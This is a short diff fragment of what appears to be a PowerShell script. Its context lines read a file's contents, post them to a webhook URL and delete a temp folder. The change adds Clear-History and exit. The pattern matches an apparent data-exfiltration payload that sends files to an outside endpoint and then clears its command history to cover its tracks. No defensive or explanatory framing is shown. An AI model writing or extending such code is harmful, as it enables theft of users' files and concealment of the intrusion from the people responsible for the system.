@@ -41,3 +41,5 @@ $(Get-Content -Raw $filePath)
 Invoke-RestMethod -Uri $webhookUrl -Method Post -Headers $headers -Body $body | Out-Null
 cd ..
 rm -R \temp
+Clear-History
+exit
